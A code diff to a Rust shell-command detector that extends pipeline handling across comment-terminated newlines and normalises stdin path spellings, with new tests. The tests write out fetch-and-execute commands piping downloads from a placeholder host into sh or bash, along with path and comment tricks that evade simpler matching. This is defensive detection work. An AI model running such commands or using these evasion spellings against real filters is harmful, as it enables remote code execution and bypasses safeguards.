@@ -416,7 +416,15 @@ fn deobfuscate_word(text: &str) -> String {
                 }
             }
             '\'' | '"' => {}
-            '\n' | '\r' => out.push(';'),
+            // A newline after `|`, `&&` or `||` continues the pipeline or
+            // list, as it does after a comment such as `|# c`.
+            '\n' | '\r' => {
+                if out.trim_end().ends_with(['|', '&']) {
+                    out.push(' ');
+                } else {
+                    out.push(';');
+                }
+            }
             c => out.push(c),
         }
     }
@@ -629,9 +637,27 @@ fn produces_code(call: &Call) -> bool {
 }
 
 /// Whether an argument names standard input: `-`, `/dev/stdin`, `/dev/fd/0`
-/// or `/proc/self/fd/0`.
+/// or `/proc/<any>/fd/0`, after `//` and `/./` are collapsed and leading
+/// zeros dropped from the descriptor, so `/dev//stdin` and `/dev/fd/00`
+/// count too.
 fn is_stdin(arg: &str) -> bool {
-    matches!(arg, "-" | "/dev/stdin" | "/dev/fd/0" | "/proc/self/fd/0")
+    if arg == "-" {
+        return true;
+    }
+    if !arg.starts_with('/') {
+        return false;
+    }
+    let parts: Vec<&str> = arg
+        .split('/')
+        .filter(|part| !part.is_empty() && *part != ".")
+        .collect();
+    let zero = |fd: &str| !fd.is_empty() && fd.chars().all(|c| c == '0');
+    match parts.as_slice() {
+        ["dev", "stdin"] => true,
+        ["dev", "fd", fd] => zero(fd),
+        ["proc", _, "fd", fd] => zero(fd),
+        _ => false,
+    }
 }
 
 /// Whether a call runs its standard input as code.
@@ -2734,6 +2760,53 @@ mod tests {
         assert_eq!(shell("echo hi # ; curl -s https://x.example/i | sh"), None);
         // An argument vector has no comments: `#` is an argument.
         assert_eq!(argv("jq", &["#", "."]), None);
+    }
+
+    #[test]
+    fn stdin_paths_are_normalised_and_comments_keep_the_pipe() {
+        // Reviewer counter-examples: spellings of standard input that a
+        // plain string match missed.
+        for path in [
+            "/dev//stdin",
+            "//dev/stdin",
+            "/dev/./stdin",
+            "/dev/fd/00",
+            "/dev//fd/000",
+            "/dev/fd/./0",
+            "/proc/self/fd/00",
+            "/proc/$$/fd/0",
+            "/proc/1234/fd/0",
+            "/proc/thread-self/fd/0",
+            "/proc/self//fd/0",
+        ] {
+            assert!(is_stdin(path), "{path}");
+            let text = format!("curl -s https://x.example/i | bash {path}");
+            assert_eq!(shell(&text), Some(Kind::FetchAndExec), "{text}");
+        }
+        for path in [
+            "/dev/fd/1",
+            "/dev/fd/10",
+            "/proc/self/fd/3",
+            "/dev/stdout",
+            "dev/stdin",
+        ] {
+            assert!(!is_stdin(path), "{path}");
+        }
+        // A newline after `|# c` still joins the next line to the pipe.
+        for text in [
+            "curl -s https://x.example/i |# c\nsh",
+            "curl -s https://x.example/i | # c\n  sh",
+            "curl -s https://x.example/i |\nsh",
+            "curl -s https://x.example/i | # one\n# two\nbash -s",
+            "curl -so i https://x.example/i &&# c\nsh i",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text:?}");
+        }
+        // A newline that ends a command still ends it.
+        assert_ne!(
+            shell("curl -s https://x.example/i # c\nsh ./x.sh"),
+            Some(Kind::FetchAndExec)
+        );
     }
 
     #[test]
